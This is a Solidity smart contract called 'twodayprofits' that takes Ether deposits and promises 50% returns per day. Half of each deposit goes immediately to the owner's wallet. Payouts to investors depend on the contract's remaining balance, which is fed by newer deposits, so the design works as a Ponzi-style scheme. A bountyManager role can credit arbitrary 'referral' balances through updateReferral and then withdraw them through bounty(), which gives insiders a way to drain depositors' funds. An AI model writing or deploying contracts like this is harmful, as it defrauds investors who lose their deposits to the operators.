1 pragma solidity ^0.4.24;
2 
3 contract twodayprofits{
4     
5     using SafeMath for uint256;
6 
7     mapping(address => uint256) investments;
8     mapping(address => uint256) joined;
9     mapping(address => uint256) withdrawals;
10     mapping(address => uint256) referrer;
11 
12     uint256 public minimum = 10000000000000000;
13     uint256 public step = 50;
14     address public ownerWallet;
15     address public owner;
16     address public bountyManager;
17 
18     event Invest(address investor, uint256 amount);
19     event Withdraw(address investor, uint256 amount);
20     event Bounty(address hunter, uint256 amount);
21     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
22     
23     /**
24      * @dev Сonstructor Sets the original roles of the contract 
25      */
26      
27     constructor(address _bountyManager) public {
28         owner = msg.sender;
29         ownerWallet = msg.sender;
30         bountyManager = _bountyManager;
31     }
32 
33     /**
34      * @dev Modifiers
35      */
36      
37     modifier onlyOwner() {
38         require(msg.sender == owner);
39         _;
40     }
41 
42     modifier onlyBountyManager() {
43         require(msg.sender == bountyManager);
44         _;
45 	}
46 
47     /**
48      * @dev Allows current owner to transfer control of the contract to a newOwner.
49      * @param newOwner The address to transfer ownership to.
50      * @param newOwnerWallet The address to transfer ownership to.
51      */
52     function transferOwnership(address newOwner, address newOwnerWallet) public onlyOwner {
53         require(newOwner != address(0));
54         emit OwnershipTransferred(owner, newOwner);
55         owner = newOwner;
56         ownerWallet = newOwnerWallet;
57     }
58 
59     /**
60      * @dev Investments
61      */
62     function () external payable {
63         require(msg.value >= minimum);
64         if (investments[msg.sender] > 0){
65             if (withdraw()){
66                 withdrawals[msg.sender] = 0;
67             }
68         }
69         investments[msg.sender] = investments[msg.sender].add(msg.value);
70         joined[msg.sender] = block.timestamp;
71         ownerWallet.transfer(msg.value.div(100).mul(50));
72         emit Invest(msg.sender, msg.value);
73     }
74 
75     /**
76     * @dev Evaluate current balance
77     * @param _address Address of investor
78     */
79     function getBalance(address _address) view public returns (uint256) {
80         uint256 minutesCount = now.sub(joined[_address]).div(1 minutes);
81         uint256 percent = investments[_address].mul(step).div(100);
82         uint256 different = percent.mul(minutesCount).div(1440);
83         uint256 balance = different.sub(withdrawals[_address]);
84 
85         return balance;
86     }
87 
88     /**
89     * @dev Withdraw dividends from contract
90     */
91     function withdraw() public returns (bool){
92         require(joined[msg.sender] > 0);
93         uint256 balance = getBalance(msg.sender);
94         if (address(this).balance > balance){
95             if (balance > 0){
96                 withdrawals[msg.sender] = withdrawals[msg.sender].add(balance);
97                 msg.sender.transfer(balance);
98                 emit Withdraw(msg.sender, balance);
99             }
100             return true;
101         } else {
102             return false;
103         }
104     }
105     
106     /**
107     * @dev Bounty reward
108     */
109     function bounty() public {
110         uint256 refBalance = checkReferral(msg.sender);
111         if(refBalance >= minimum) {
112              if (address(this).balance > refBalance) {
113                 referrer[msg.sender] = 0;
114                 msg.sender.transfer(refBalance);
115                 emit Bounty(msg.sender, refBalance);
116              }
117         }
118     }
119 
120     /**
121     * @dev Gets balance of the sender address.
122     * @return An uint256 representing the amount owned by the msg.sender.
123     */
124     function checkBalance() public view returns (uint256) {
125         return getBalance(msg.sender);
126     }
127 
128     /**
129     * @dev Gets withdrawals of the specified address.
130     * @param _investor The address to query the the balance of.
131     * @return An uint256 representing the amount owned by the passed address.
132     */
133     function checkWithdrawals(address _investor) public view returns (uint256) {
134         return withdrawals[_investor];
135     }
136 
137     /**
138     * @dev Gets investments of the specified address.
139     * @param _investor The address to query the the balance of.
140     * @return An uint256 representing the amount owned by the passed address.
141     */
142     function checkInvestments(address _investor) public view returns (uint256) {
143         return investments[_investor];
144     }
145 
146     /**
147     * @dev Gets referrer balance of the specified address.
148     * @param _hunter The address of the referrer
149     * @return An uint256 representing the referral earnings.
150     */
151     function checkReferral(address _hunter) public view returns (uint256) {
152         return referrer[_hunter];
153     }
154     
155     /**
156     * @dev Updates referrer balance 
157     * @param _hunter The address of the referrer
158     * @param _amount An uint256 representing the referral earnings.
159     */
160     function updateReferral(address _hunter, uint256 _amount) onlyBountyManager public {
161         referrer[_hunter] = referrer[_hunter].add(_amount);
162     }
163     
164 }
165 
166 /**
167  * @title SafeMath
168  * @dev Math operations with safety checks that throw on error
169  */
170 library SafeMath {
171     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
172         if (a == 0) {
173             return 0;
174         }
175         uint256 c = a * b;
176         assert(c / a == b);
177         return c;
178     }
179 
180     function div(uint256 a, uint256 b) internal pure returns (uint256) {
181         // assert(b > 0); // Solidity automatically throws when dividing by 0
182         uint256 c = a / b;
183         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
184         return c;
185     }
186 
187     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
188         assert(b <= a);
189         return a - b;
190     }
191 
192     function add(uint256 a, uint256 b) internal pure returns (uint256) {
193         uint256 c = a + b;
194         assert(c >= a);
195         return c;
196     }
197 }